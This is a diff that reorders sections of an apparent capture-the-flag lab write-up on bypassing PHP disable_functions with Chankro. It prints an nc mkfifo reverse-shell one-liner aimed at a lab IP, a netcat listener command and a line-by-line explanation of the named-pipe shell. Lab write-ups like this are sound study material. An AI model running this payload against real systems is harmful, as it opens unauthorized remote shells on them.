@@ -81,28 +81,7 @@ The nc mkfifo payload is very nice.  Change the IP to your attacker machine IP. 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
 ```  
-
-## Setup the netcat listener on localhost    
-```  
-nc -nvlp 9001
-```  
-
-## Navigate to or curl /uploads/tryhackme.php  
-![](/thm-bdf/thm-bdf-nc-mkfifo-shell.png)  
-
-I tried a few variations before settling on the nc mkinfo method. Some results of my testing show us the nature of what Chankro is doing behind the scenes. We obviously called the mail() PHP function to get our c.php to run. Kindof ingenious.  
-
-## Bind shell  
-![](/thm-bdf/thm-bdf-bind-shell.png)  
-
-## Reverse Shell  
-![](/thm-bdf/thm-bdf-rev-shell.png)
-
-
-# Tangent about Reverse Shells and Named Pipes  
-```  
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
-```  
+## Tangent about Reverse Shells and Named Pipes  
 
 Here’s how it works:
 
@@ -112,6 +91,24 @@ Here’s how it works:
 4. **```sh -i 2>&1|```** Starts an interactive shell (“sh”) and redirects stderr to the same address stdout is using. 2 represents standard error, 1 represents standard output. Redirect to address.
 5. **```nc 10.10.10.10 9001```** Initiates a network connection to IP address 10.10.10.10 on port 9001.
 6. **```>/tmp/f```** Redirects the standard output of the entire command (including the output from the interactive shell and the output from “nc”) to the named pipe “f” which is then read by **```cat```**.
+
+## Setup the netcat listener on localhost    
+```  
+nc -nvlp 9001
+```  
+
+## Navigate to or curl /uploads/tryhackme.php  
+Our payload is executed and we receive a connection.  
+
+![](/thm-bdf/thm-bdf-nc-mkfifo-shell.png)  
+
+I tried a few variations before settling on the nc mkinfo method. Some results of my testing show us the nature of what Chankro is doing behind the scenes. We obviously called the mail() PHP function to get our c.php to run. Kindof ingenious.  
+
+## Bind shell  
+![](/thm-bdf/thm-bdf-bind-shell.png)  
+
+## Reverse Shell  
+![](/thm-bdf/thm-bdf-rev-shell.png)  
 
 ## Links I found along the way...  
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass  
